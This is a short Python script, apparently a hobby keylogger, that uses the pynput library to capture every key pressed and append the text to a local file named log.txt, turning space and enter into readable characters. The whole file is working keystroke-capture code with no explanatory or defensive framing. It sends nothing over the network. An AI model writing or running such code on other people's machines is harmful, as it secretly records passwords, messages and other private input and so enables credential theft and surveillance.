from pynput.keyboard import Listener


def writeoffile(key):
    keydata = str(key)
    if keydata == "Key.space":
        keydata =" "
    if keydata == "Key.shift_r":
        keydata = ""
    if keydata == "Key.ctrl_l":
        keydata =""
    if keydata=="Key.alt_l":
        keydata = ""
    if keydata == "Key.tab":
        keydata = ""
    if keydata == "Key.backspace":
        keydata = ""
    if keydata == "Key.enter":
        keydata ='\n'

    keydata = keydata.replace("'","")

    with open('log.txt','a')as f:
        f.write(keydata)

with Listener(on_press=writeoffile) as l:
    l.join()
